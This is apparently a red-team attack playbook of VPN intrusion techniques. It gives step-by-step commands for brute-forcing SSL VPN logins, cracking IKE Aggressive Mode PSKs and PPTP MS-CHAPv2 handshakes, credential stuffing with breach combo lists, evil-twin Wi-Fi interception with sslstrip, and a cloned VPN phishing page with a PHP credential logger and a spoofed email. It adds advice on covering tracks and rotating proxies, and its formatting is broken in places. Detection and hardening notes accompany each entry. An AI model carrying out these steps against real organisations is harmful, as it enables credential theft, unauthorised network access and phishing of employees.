Intruder1. Open Burp Suite2. Send login POST request to Intruder3. Set payloads on username and password4. Load your wordlists5. Start attack → Check response status/length✅ Look for different status or response length (200 OK vs 403 or 302 redirect)---### 🟢 STEP 8: Use Cracked Credentials for VPN Access• If valid creds found → use OpenVPN or browser• Access internal network✅ Example:openvpn --config vpn.ovpn --auth-user-pass cracked.txt➡️ Now you’re inside the internal org network---### 🛑 STEP 9: Cleanup & Cover Tracks• Remove logs: rm ~/.bash_history, clear• Disable network interface if used in real pentest---### 🧠 Tips for Red Teams:• Use credential stuffing from past breaches• Obfuscate user-agents, rotate proxies• Check for SSO portals (Okta, Duo, etc.)• Combine with MFA bypass attacks• Ideal for dataset training on failed login patterns
- **Detection**: - Monitor login attempts - Rate limit logs - VPN auth logs (radius, syslog) - SIEM alert on multiple failed logins from same IP - Watch for mass POSTs
- **Solution**: - Enforce MFA on VPN - Enable IP lockouts / CAPTCHA - Monitor brute-force indicators - Harden VPN portal config - Password policy enforcement - Log failed login attempts
- **Tags**: #VPNBruteForce #SSLVPN #Hydra #OpenVPN #CredentialStuffing #ExternalAttackSurface #InitialAccess #RedTeam #PasswordAttack

## IKE Aggressive Mode Hash Extraction (IPSec VPN)

- **Attack Type**: Pre-Shared Key (PSK) Cracking via Aggressive Mode
- **Target**: Publicly exposed VPN appliancesFirewallsLegacy IPSec serversVPN concentrators
- **Vulnerability**: IKEv1 Aggressive Mode enabledPSK hash disclosureNo rate-limiting on handshakes
- **MITRE**: T1040 – Network SniffingT1110.003 – Brute Force: Password CrackingT1190 – Exploit Public-Facing Application
- **Impact**: - Extracts VPN PSK without access - Initial VPN compromise - Internal network access - Credential reuse risk
- **Tools**: ✅ Kali Linux (Attacker)✅ ike-scan✅ pike (for parsing payloads)✅ hashcat or john (for offline PSK cracking)✅ Wordlists (rockyou.txt, vpn.lst)✅ Wireshark (optional)
- **Scenario**: This simulation demonstrates how attackers can exploit misconfigured IPSec VPNs using IKEv1 Aggressive Mode to extract hashed PSKs from exposed VPN endpoints. Many older or misconfigured VPN devices (like Cisco, Check Point, and SonicWall) use Aggressive Mode instead of Main Mode, leaking identity and challenge/response data. This allows attackers to capture the hash of the PSK and then brute-force it offline using tools like Hashcat. This is a real-world attack used by APTs and pentesters to gain VPN credentials without access to any internal system.
- **Attack Steps**: ### 🟢 STEP 1: Recon for IPSec VPN GatewayUse nmap to find VPN services:nmap -sU -p 500 --script ike-version TARGET-IP✅ Look for response indicating IKEv1 support:IKE Version: 1→ This means the target is using Internet Key Exchange (IKE) on UDP/500🧠 Bonus: Use Shodan to find exposed VPNsSearch: port:500 "ISAKMP" or Aggressive Mode---### 🟢 STEP 2: Probe for Aggressive Mode SupportRun:ike-scan -M -A -P -v TARGET-IPFlags:• -M = multicast mode (send ISAKMP request)• -A = force Aggressive Mode• -P = save packets• -v = verbose✅ Output (Success):\[UDP 500\] Aggressive Mode Handshake Response received<br>Hash: 0123abcd4567...<br>Responder ID: "vpn.company.com"<br>````<br><br>➡️ This means the target **exposes hash of PSK (pre-shared key)**<br><br>---<br>### 🟢 STEP 3: Save Hash for Offline Cracking<br>`ike-scan` automatically saves response as `pskcrack.log`<br><br>Or manually copy hash line:<br>`nano vpn_hash.txt` → Paste:<br>`0123abcd4567890effeeddcc...`<br><br>🧠 Optionally convert to Hashcat format:<br>Use `psk-crack` or manually convert to `$ikepsk$...` format<br><br>---<br>### 🟢 STEP 4: Crack the PSK Offline Using Hashcat<br>✅ For Hashcat:<br>Mode: `5300` (IKE-PSK Aggressive Mode)<br><br>Run:<br>`hashcat -m 5300 vpn_hash.txt /usr/share/wordlists/rockyou.txt`<br><br>✅ For John:<br>Convert hash with `psk-crack`:<br>`./psk-crack pskcrack.log > john_hash.txt`<br>`john --format=ike --wordlist=rockyou.txt john_hash.txt`<br><br>🧠 TIPS:<br>• Try custom wordlists (`vpn.lst`, weakpasswords.txt)<br>• GPU cracking is 50x faster<br><br>✅ If successful:<br>`Cracked PSK: companyvpn123`<br><br>---<br>### 🟢 STEP 5: Use Cracked PSK to Connect to VPN<br>1. Install OpenVPN, StrongSwan, or Libreswan client<br>2. Create config file:<br>`nano vpn.conf`<br><br>Example config:<br>\nconn vpn\n ike=aes256-sha1-modp1024\n esp=aes256-sha1\n keyexchange=ikev1\n left=%defaultroute\n right=TARGET-IP\n rightid=vpn.company.com\n auto=start\n authby=secret\n```\n3. Save cracked key to /etc/ipsec.secrets:TARGET-IP : PSK "companyvpn123"4. Start connection:ipsec up vpn✅ If successful, you are now inside the VPN!---### 🟢 STEP 6: Monitor and Save Dataset (Optional)• Open Wireshark• Filter: udp.port == 500• Save handshake packets as .pcap• Use for ML training: ike_hash_extraction.pcapLabel events:• Aggressive Mode Handshake = hash_exposure• Crack success = vpn_cred_recovery---### 🛑 STEP 7: Cleanup and Hardening (For Real Environments)✅ Delete hash:rm vpn_hash.txt✅ Disable Aggressive Mode on VPN servers:• Use Main Mode only• Avoid using IKEv1 if possible (prefer IKEv2)✅ Rotate PSK regularly✅ Enforce certificate-based authentication or MFA✅ Alert on multiple IKE handshake attempts---### 🧠 Red Team Pro Tips:• Pair this with ikeforce for user/group guessing• Combine with password reuse from past dumps• Train detection models on entropy/length of hash responses
- **Detection**: - Detect aggressive mode IKE requests - SIEM alert on UDP/500 floods - Monitor for unusual VPN logins - Detect hash cracking attempts on GPU - Alert on VPN config downloads
- **Solution**: - Disable IKE Aggressive Mode - Enforce IKEv2 + certificates - Use complex, long PSKs - Rate-limit VPN handshake attempts - Deploy VPN MFA wherever possible
- **Tags**: #IKEv1 #AggressiveMode #VPNCrack #Hashcat #PSKBruteforce #IPSec #IKEScan #PasswordAttack #InitialAccess #RedTeam

## PPTP VPN MS-CHAPv2 Cracking

- **Attack Type**: Encrypted Credential Capture + Offline Crack
- **Target**: Legacy VPN systemsWindows RRASRouters with PPTPSmall business firewalls
- **Vulnerability**: Insecure MS-CHAPv2 handshakePoor cryptographyNo mutual authentication
- **MITRE**: T1040 – Network SniffingT1110.003 – Password CrackingT1133 – External Remote Services
- **Impact**: - Steals VPN password - Full VPN compromise - Lateral movement via reused creds - Credential reuse on SMB/RDP
- **Tools**: ✅ Kali Linux or Parrot OS✅ Router running PPTP or Windows VPN server✅ Wireshark✅ chapcrack✅ asleap or hashcat✅ Optional: tcpdump, VPN client on Windows
- **Scenario**: This simulation shows how attackers capture and crack MS-CHAPv2 authentication handshakes from PPTP VPN connections, which are still in use in legacy systems. MS-CHAPv2 uses weak cryptographic schemes that allow attackers to extract challenge-response values and brute-force the NTLM hash offline using tools like asleap or chapcrack. Once cracked, the attacker obtains the user’s NTLM hash or cleartext password, which may be reused elsewhere (e.g., domain login, RDP, SMB). This attack is extremely effective for gaining initial VPN access and lateral movement in real-world engagements.
- **Attack Steps**: ### 🟢 STEP 1: Set Up PPTP VPN for Testing (or Target One in Wild)1. Use another machine (or router) to host PPTP VPN➡️ Windows: Enable Remote Access Role (RRAS) → Enable PPTP VPN➡️ Router: Enable PPTP VPN service2. Make sure PPTP is running on TCP port 1723✅ Client should connect using MS-CHAPv2✅ Username: demo, Password: 12345678 (for lab)🧠 For real targets, scan with:nmap -p 1723 --script pptp-version <target-ip>---### 🟢 STEP 2: Capture MS-CHAPv2 Handshake Using Wireshark1. On Kali (Attacker), run:sudo wireshark → Interface: eth0 or wlan02. Set capture filter:tcp port 17233. Have victim connect to the VPN✅ Wireshark captures CHAP handshakeFilter: pptp or chap✅ Look for:• CHAP Challenge• CHAP Response• UsernameRight-click → “Follow TCP Stream” → Save entire captureFile → Export Packet Bytes → Save as chap.cap---### 🟢 STEP 3: Extract MS-CHAPv2 Hash with chapcrackOn Kali:chapcrack parse chap.cap✅ Output:\nFound MS-CHAPv2 handshake:\nUsername: demo\nChallenge: 112233445566...\nResponse: aabbccddeeff...\n````<br><br>➡️ Save to file:<br>`chapcrack crack -i chap.cap -o chap_hash.crack`<br><br>---<br>### 🟢 STEP 4: Crack the Challenge Using `asleap` or `hashcat`<br>✅ Option A: Using `asleap` (simple)<br>`asleap -C <challenge> -R <response> -W /usr/share/wordlists/rockyou.txt`<br><br>✅ Option B: Using `hashcat` (mode 5500)<br>1. Convert to hashcat format:<br>Format: `username:$NETNTLMv1$112233445566::aabbccddeeff...`<br><br>2. Save to `mschap.hash`<br><br>3. Run:<br>`hashcat -m 5500 mschap.hash /usr/share/wordlists/rockyou.txt`<br><br>✅ Output:<br>\n[STATUS] demo : 12345678\n````➡️ Password 12345678 is cracked from captured MS-CHAPv2---### 🟢 STEP 5: Use Cracked Password to Access VPN• On Windows or Kali:• Open Network Manager or use openvpn, pptpsetup✅ Login with:• Server IP: <target-ip>• Username: demo• Password: 12345678➡️ You are now inside the VPN---### 🟢 STEP 6: Lateral Movement (Optional Post-Access)• Use cracked password on:➡️ SMB: smbclient //target/share -U demo➡️ RDP: xfreerdp /u:demo /p:12345678 /v:<ip>➡️ Kerberoast, Pass-the-Hash if domain joined---### 🟢 STEP 7: Save Dataset for ML or SIEM Testing• Save PCAP file as: mschap_capture.pcap• Label:→ MS-CHAPv2 Handshake → chap_handshake→ Cracked Password → vpn_password_recovery---### 🛑 STEP 8: Cleanup and Hardening (Production Systems)• Disable PPTP on servers• Migrate to OpenVPN / IKEv2 / WireGuard• Enforce EAP-TLS with certificates• Block port 1723 on firewalls• Monitor for CHAP-based login attempts🧠 Tips:• PPTP is deprecated — never use in production• Cracking MS-CHAPv2 is GPU-accelerated — protect credentials!• Monitor VPN login logs for old CHAP auth usage
- **Detection**: - Monitor TCP/1723 traffic - Alert on CHAP challenge patterns - Detect brute-force cracking attempts - Review VPN server auth logs
- **Solution**: - Disable PPTP - Use OpenVPN/IPSec with EAP-TLS - Avoid MS-CHAPv2 - Enforce certificate-based auth - Block legacy VPN ports (TCP/1723)
- **Tags**: #MSCHAPv2 #PPTP #VPNCrack #chapcrack #asleap #Hashcat #LegacyVPN #CredentialAttack #InitialAccess

## Credential Reuse from Breaches

- **Attack Type**: Account Takeover via Password Reuse
- **Target**: Public-facing login portalsSaaS systemsSSL VPNOffice365 or OWAWeb dashboards
- **Vulnerability**: Credential reuseNo MFANo IP restrictionNo brute-force protectionCommon passwords
- **MITRE**: T1078 – Valid AccountsT1110.004 – Credential StuffingT1133 – External Remote Services
- **Impact**: - Full account takeover - Internal network access - Business email compromise (BEC) - Data exfiltration risk - Privilege escalation possible
- **Tools**: ✅ Kali Linux✅ Sentry MBA, Snipr, or custom Python scripts✅ Combo list from breach dump (email:password)✅ Optional: hydra, burp, or wfuzz✅ VPN/Web login target (e.g., Outlook Web Access, SSL VPN, CRM login page)✅ SIEM or logs for detection (Splunk, ELK)
- **Scenario**: This simulation demonstrates how attackers perform credential stuffing attacks using username/password pairs leaked in previous data breaches (like LinkedIn, Canva, etc.). Many users reuse passwords across services, so attackers script login attempts across corporate web apps, VPN portals, email systems, or SaaS services to hijack valid accounts. This method is widely used by APT groups and ransomware actors for initial access into target environments.
- **Attack Steps**: ### 🟢 STEP 1: Collect Breached Credentials (Combo List)✅ Use public dumps (check if in-scope or use your own data):• HaveIBeenPwned• Breach forums (for internal red team labs)• Example file: combo.txt:```\njohn.doe@example.com:Password123\nalice.hr@example.com:alice@2020\n````🧠 Tip: Use only allowed data for testing or your own org's known credentials---### 🟢 STEP 2: Identify Target Login PortalsScan for login surfaces:• vpn.target.com (SSL VPN)• mail.target.com/owa (Outlook Web Access)• login.target.com (SSO / internal tools)✅ Use nmap or manual reconExample:nmap -p 443 --script http-title target.com---### 🟢 STEP 3: Analyze Login Form Parameters1. Use browser → try dummy login2. Open Burp Suite → Intercept POST request✅ Find:• POST endpoint (e.g., /auth)• Field names: username, passwordExample Request:POST /auth/loginusername=john.doe@example.com&password=Password123---### 🟢 STEP 4: Automate Credential Reuse Testing✅ Use hydra:hydra -L emails.txt -P passwords.txt target.com https-post-form "/auth/login:username=^USER^&password=^PASS^:Invalid"✅ Or use Python script with requests module:Loop through combo file → Submit login → Check response code✅ Or use Sentry MBA or Snipr (GUI brute-force tools)• Load combo list• Set endpoint and response failure key• Launch attack---### 🟢 STEP 5: Detect Valid HitsHydra or your tool will show valid credentials:[SUCCESS] john.doe@example.com : WelcomeBack123✅ Try logging in manually via browser to confirm---### 🟢 STEP 6: Post-Login AccessAfter login success:• Access internal dashboard• Browse CRM or VPN area• Upload reverse shell or implant• Check for privilege escalation pathsOptional: Dump session cookie or replay token for reuse---### 🟢 STEP 7: Save Dataset (Optional)• Save valid hits to file: valid_hits.txt• Label for training:→ login_attempts→ credential_successOptional: Generate .pcap using Wireshark for ML---### 🛑 STEP 8: Cleanup• Delete combo file• Log out of all sessions• Revoke valid tokens• If real engagement: Report reused credentials to Blue Team🧠 Tips:• Rotate IPs via proxychains or Tor• Monitor lockout policies• Red teams should stop after N successful logins---
- **Detection**: - SIEM alert on multiple failed logins - Monitor unusual login times/IPs - Correlate with known breach lists - Geo-anomaly detection - Failed login frequency threshold
- **Solution**: - Enforce MFA on all external logins - Use credential breach detection tools (e.g., Enzoic, HaveIBeenPwned API) - Block reused passwords - Rate-limit login attempts - User awareness on password hygiene
- **Tags**: #CredentialReuse #BreachDump #AccountTakeover #ValidAccount #RedTeam #InitialAccess #MFABypass #Hydra #ComboListAttack

## MITM VPN Credentials via Rogue AP

- **Attack Type**: Credential Theft via Wi-Fi MITM (Evil Twin)
- **Target**: Wireless laptopsRemote workersBYOD usersCorporate users on Wi-Fi
- **Vulnerability**: - No HTTPS enforcement - Open Wi-Fi or weak WPA - Lack of VPN MFA - No cert pinning or HSTS
- **MITRE**: T1557.003 – Adversary-in-the-Middle: Rogue Wi-FiT1078 – Valid AccountsT1040 – Network Sniffing
- **Impact**: - Steal VPN creds - Hijack sessions - Full VPN access - Access internal network - Enable lateral movement
- **Tools**: ✅ Kali Linux with Wi-Fi adapter✅ airbase-ng (Rogue AP)✅ dnsmasq (DHCP/DNS)✅ ettercap, mitmproxy, Bettercap (MITM)✅ sslstrip or sslsplit (downgrade SSL)✅ Wireshark or tcpdump✅ Victim device with VPN client or browser
- **Scenario**: This simulation shows how an attacker sets up a rogue Wi-Fi access point (AP) to impersonate a trusted wireless network (like Corp-WiFi). Victims connect to it unknowingly, thinking it’s legitimate. The attacker then performs Man-in-the-Middle (MITM) attacks to capture VPN login credentials, often targeting SSL VPN logins (e.g., Fortinet, Pulse Secure) or web-based portals like OWA. This is a highly effective tactic for compromising remote workers, airport/hotel guests, or conference attendees.
- **Attack Steps**: ### 🟢 STEP 1: Set Up Lab Environment✅ One Kali Linux machine (attacker)✅ One laptop/phone as victim✅ Wireless adapter that supports AP mode (e.g., Alfa AWUS036NHA)✅ Check adapter:iwconfig → Should show wlan0 in "Monitor Mode"---### 🟢 STEP 2: Launch Rogue Access PointUse airbase-ng to mimic real Wi-Fi:airbase-ng -e "Corp-WiFi" -c 6 wlan0mon✅ This creates a fake AP named Corp-WiFiNow assign IPs using dnsmasq:bash<br>nano dnsmasq.conf<br>interface=at0<br>dhcp-range=10.0.0.10,10.0.0.100,12h<br>dhcp-option=3,10.0.0.1<brdhcp-option=6,10.0.0.1<br>Run:dnsmasq -C dnsmasq.conf✅ Clients now get IPs and DNS via rogue AP---### 🟢 STEP 3: Redirect Traffic to Attacker1. Enable IP forwarding:echo 1 > /proc/sys/net/ipv4/ip_forward2. Setup iptables:iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADEiptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080---### 🟢 STEP 4: Run SSLStrip or mitmproxyOption A: sslstripsslstrip -l 8080➡️ This forces HTTP downgradeOption B: mitmproxy --mode transparent -p 8080➡️ Full HTTPS logging with certificates---### 🟢 STEP 5: Victim Connects to Rogue AP1. Victim sees Corp-WiFi2. Connects (no password or cloned WPA password)3. Opens browser → redirected to VPN page• Example: vpn.corp.com or mail.corp.comAttacker captures:✅ Username✅ Password✅ Full POST requestView in mitmproxy or log file:POST /auth/login → username=john&password=Welcome123---### 🟢 STEP 6: Capture and Store Credentials1. Save HTTP POST logs:mitmproxy -w captured_creds.log2. Export session to .pcap via tcpdump:tcpdump -i at0 -w vpn_credentials.pcap✅ Label: vpn_credential_capture🧠 Can also fingerprint VPN portals like Fortinet, SonicWall, etc.---### 🟢 STEP 7: Use Credentials for Access (Optional)• Use stolen creds on:➡️ VPN login page➡️ OWA / SSO / Citrix portal➡️ Try login with:john@corp.com : Welcome123✅ Establish VPN session if MFA not enabled---### 🛑 STEP 8: Cleanup• Kill airbase-ng, dnsmasq, sslstrip• Turn off monitor mode:airmon-ng stop wlan0mon• Delete logs: rm *.cap *.log🧠 Red Team Tip:• Add captive portal or fake VPN login page• Log User-Agent, browser type, etc.• Works best in open Wi-Fi environments (cafes, airports)---
- **Detection**: - Detect rogue APs (WIDS/WIPS) - Monitor sudden login from new IPs - Correlate VPN login with Wi-Fi logs - Check for multiple auth attempts from same MAC/IP
- **Solution**: - Enforce HTTPS (HSTS, TLS only) - Block split-tunnel VPNs - Use certificate pinning - Deploy Wireless Intrusion Detection (WIDS) - Always use VPN with MFA - Disable open corporate Wi-Fi
- **Tags**: #MITM #RogueAP #EvilTwin #VPNCredentialTheft #SSLStrip #WirelessSecurity #MITMProxy #CredentialHarvesting #RedTeam

These credentials are then reused to access internal networks or escalate privileges. This is a commonly used initial access tactic in APT campaigns and ransomware operations. The fake page closely mimics the legitimate VPN portal. Often combined with typosquatting, URL obfuscation, or HTTPS trickery to avoid user suspicion.
- **Attack Steps**: ### 🟢 STEP 1: Clone the Real VPN Login Page1. Go to real VPN login portal:• Example: https://vpn.company.com2. Right-click → “View Page Source” → Copy HTML3. Save as vpn_clone.html✅ Edit form's action to capture credentials:html<br><form action="save.php" method="post">4. Create save.php to log credentials:php<br>$file = fopen("creds.txt", "a");<br>fwrite($file, $_POST['username'].":".$_POST['password']."\n");<br>fclose($file);<br>---### 🟢 STEP 2: Host Phishing Page on Attacker Server1. Copy vpn_clone.html and save.php to /var/www/html2. Start Apache:sudo service apache2 start✅ Test: Visit http://localhost → Page loads3. Expose to internet using ngrok:./ngrok http 80➡️ You get a link like: https://vpn-company-logins.ngrok.io✅ Your phishing page is now live---### 🟢 STEP 3: Craft a Realistic Phishing EmailUse GoPhish or manual email:Subject: [ACTION REQUIRED] VPN Password Expiry NoticeBody:\nDear Employee,\nYour VPN password will expire in 24 hours. Please log in to reset it:\n\nhttps://vpn-company-logins.ngrok.io\n\nThanks,\nIT Department\n✅ Masked link uses a legitimate-looking domainOptional: Spoof sender as it-support@company.com---### 🟢 STEP 4: Send Phishing Email to Victim1. Use sendemail or GoPhish:sendemail -f it-support@company.com -t victim@company.com -u "VPN Reset" -m "Click here: [phishing URL]" -s smtp.example.com:5872. Victim opens email, clicks link3. Fake login page loadsVictim enters credentials:✅ Saved to creds.txt as john.doe@company.com:SuperSecret123---### 🟢 STEP 5: Use Captured CredentialsTry logging into real VPN portal:https://vpn.company.com → Use stolen credentials➡️ If successful:• Internal network access• File share access (SMB)• Jump to RDP or Outlook Web AccessOptional:• Use on Office365 / Azure AD if single sign-on is enabled---### 🟢 STEP 6: Dataset Creation (Optional for ML/Defense)1. Save phishing HTML, responses2. Export Apache logs from /var/log/apache2/access.log3. Extract:• Timestamps• IPs• User-Agent✅ Label data:• phish_landing_page• vpn_credential_submit---### 🛑 STEP 7: Cleanup• Stop Apache: service apache2 stop• Delete phishing page: rm *.html *.php• Revoke any used VPN tokens (if red team)• Notify Blue Team of phishing exposure🧠 Red Team Tips:• Use Let's Encrypt to add HTTPS (credibility)• Register a lookalike domain: vpn-portal.com-login.site• Deploy browser fingerprinting to detect victim device
- **Detection**: - Monitor email links clicked by users - Detect multiple login failures from new IPs - Alert on VPN logins from unknown geos - Use URL threat detection in mail gateway
- **Solution**: - Enforce MFA on VPN and email - Conduct regular phishing training - Deploy DMARC/SPF/DKIM email protection - Block newly registered domains - Use DNS filtering to block phishing domains

## Weak VPN Certificate / Key Cracking

- **Attack Type**: Certificate Brute Force / Weak Crypto
- **Target**: DevOps / AdminsAny org using OpenVPN or IPsec certsRemote workforce
- **Vulnerability**: - Weak key passphrases - Exposed unencrypted keys - No MFA on cert-based VPN - No key expiration or rotation
- **MITRE**: T1552 – Unsecured CredentialsT1555.003 – Credentials from Web ServicesT1110.002 – Brute Force: Password Cracking
- **Impact**: - Full VPN access - Internal network compromise - Privilege escalation - Supply chain risk (dev VPNs)
- **Tools**: ✅ Kali Linux or Parrot OS✅ openssl✅ John the Ripper with OpenSSL module✅ ssh-keygen or pkcrack (optional)✅ GitHub/Google for leaked .key files✅ VPN server (internal or test lab)✅ Sample .ovpn, .key, .crt files
- **Scenario**: This simulation demonstrates how attackers exploit weakly protected VPN certificate-based authentication, such as unencrypted .key files, default passphrases, or low-entropy private keys used in OpenVPN or IPsec configurations. If the private key is cracked or extracted, the attacker can impersonate legitimate VPN clients and gain unauthorized access to internal systems. This attack is commonly used against exposed .ovpn configs, misconfigured PKI, or developer/test environments.
- **Attack Steps**: ### 🟢 STEP 1: Identify or Acquire the Target .key FileUse Google or GitHub Dorks:site:github.com "client.key" "BEGIN PRIVATE KEY"Download .key file (example):curl -O https://raw.githubusercontent.com/org/vpn/configs/client.key✅ This file is often found inside .ovpn bundles🧠 Target files might also come from:• Breaches• Shared cloud drives• Public S3 buckets---### 🟢 STEP 2: Inspect the Private Key FormatRun:cat client.keyLook for format:-----BEGIN ENCRYPTED PRIVATE KEY----- (needs cracking)-----BEGIN PRIVATE KEY----- (unencrypted, use directly)If it’s encrypted (good) → proceed to brute-forceIf not encrypted → skip to Step 4---### 🟢 STEP 3: Brute Force the Key Passphrase (if encrypted)1. Convert .key file to crackable format:openssl rsa -in client.key -passin pass:testIf incorrect password, OpenSSL throws error:unable to load Private Key2. Use John the Ripper with OpenSSL module:• Convert to crackable format:openssl pkey -in client.key -out key_to_crack.key -aes128ssh2john key_to_crack.key > key.hash• Run John:john --wordlist=/usr/share/wordlists/rockyou.txt key.hash✅ John will try common passwords like:password, 12345678, company@2020, etc.When cracked, you’ll see:password123 (key_to_crack.key)---### 🟢 STEP 4: Rebuild Full VPN Config with Cracked KeyIf you only got the .key file, download/create matching .ovpn:bash\nclient\ndev tun\nproto udp\nremote vpn.target.com 1194\nresolv-retry infinite\nnobind\npersist-key\npersist-tun\nca ca.crt\ncert client.crt\nkey client.key\nMake sure files client.crt, client.key, ca.crt are in same folder✅ Place cracked or unencrypted key into client.key---### 🟢 STEP 5: Connect to VPN Using the KeyRun:sudo openvpn --config client.ovpn➡️ Connection succeeds silently if key is valid➡️ You’re now inside the VPN as a legitimate userRun:ip a → check tun0 interfaceping 10.0.0.1 → ping internal gateway🧠 Some VPNs skip user/pass when certificate auth is enabled---### 🟢 STEP 6: Explore Internal ResourcesUse Nmap:nmap -sT 10.0.0.0/24Find:• SMB shares• RDP services• Jenkins dashboards• Git repositories✅ Use cracked VPN access to laterally move within internal LAN---### 🟢 STEP 7: Optional Dataset Creation• Save key, logs, and .pcap:tcpdump -i tun0 -w weak_key_vpn.pcap• Save cracked password hash• Label:vpn_key_crackvpn_internal_access---### 🛑 STEP 8: Cleanup• Disconnect VPN: CTRL+C• Delete key & credentials• If part of engagement: Notify Blue Team• Rotate exposed keys immediately🧠 Red Team Tips:• Use openvpn --verb 9 for verbose logs• Setup your own VPN to simulate key-based auth cracking• Check if .key files are base64-encoded in .ovpn---
- **Detection**: - Alert on suspicious VPN connections - Monitor GitHub leaks for .key, .ovpn - Analyze OpenVPN logs for user fingerprint mismatches - Look for odd login times/regions
- **Solution**: - Never hardcode credentials or leave keys unencrypted - Use short-lived client certs with passphrases - Rotate all keys regularly - Enforce VPN MFA even with certs - Scan GitHub and cloud for secrets exposure
- **Tags**: #VPNKeyCrack #OpenVPN #UnencryptedKey #CertBasedAuth #KeyLeak #RedTeam #MITRE #InitialAccess #CyberHygiene
